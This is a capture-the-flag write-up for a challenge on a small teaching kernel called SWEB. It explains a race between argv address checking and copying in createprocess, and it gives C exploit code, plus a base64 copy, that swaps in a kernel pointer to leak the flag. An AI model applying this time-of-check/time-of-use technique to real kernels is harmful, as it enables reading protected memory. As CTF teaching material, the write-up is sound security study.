## Solution

There's a race condition between checking the addresses of argv, and copying the data in createProcess.
My exploit looks like this:

```
#include "stdio.h"
#include "nonstd.h"
#include "sched.h"

int main(int argc, char** argv)
{
    if(argc == 0)
    {
        char *args[] = {(char*)"ASDF", 0};
        printf("Should later print %s\n", args[0]);
        createprocess("/usr/exploit.sweb", 0, args);
        args[0] = (char*) 0xffffffff801325bd;
        while(1)
        {
            sched_yield();
        }
        sched_yield();
        sched_yield();
        sched_yield();
        sched_yield();
    }
    else
    {

        printf("Argument was %s\n", argv[0]);
        while(1);
    }
}

```
call createprocess, change the pointers, yield so the first process doesn't die until the second one could copy, boom.

Endless loops are just there to keep the flag in frame, otherwise you'd have to scroll up.

Base64encode that stuff and you're done:

```
I2luY2x1ZGUgInN0ZGlvLmgiCiNpbmNsdWRlICJub25zdGQuaCIKI2luY2x1ZGUgInNjaGVkLmgiCgppbnQgbWFpbihpbnQgYXJnYywgY2hhcioqIGFyZ3YpCnsKICAgIGlmKGFyZ2MgPT0gMCkKICAgIHsKICAgICAgICBjaGFyICphcmdzW10gPSB7KGNoYXIqKSJBU0RGIiwgMH07CiAgICAgICAgcHJpbnRmKCJTaG91bGQgbGF0ZXIgcHJpbnQgJXNcbiIsIGFyZ3NbMF0pOwogICAgICAgIGNyZWF0ZXByb2Nlc3MoIi91c3IvZXhwbG9pdC5zd2ViIiwgMCwgYXJncyk7CiAgICAgICAgYXJnc1swXSA9IChjaGFyKikgMHhmZmZmZmZmZjgwMTMyNWJkOwogICAgICAgIHdoaWxlKDEpCiAgICAgICAgewogICAgICAgICAgICBzY2hlZF95aWVsZCgpOwogICAgICAgIH0KICAgICAgICBzY2hlZF95aWVsZCgpOwogICAgICAgIHNjaGVkX3lpZWxkKCk7CiAgICAgICAgc2NoZWRfeWllbGQoKTsKICAgICAgICBzY2hlZF95aWVsZCgpOwogICAgfQogICAgZWxzZQogICAgewoKICAgICAgICBwcmludGYoIkFyZ3VtZW50IHdhcyAlc1xuIiwgYXJndlswXSk7CiAgICAgICAgd2hpbGUoMSk7CiAgICB9Cn0K
```


There's probably a few unintended solutions in there, but whatever
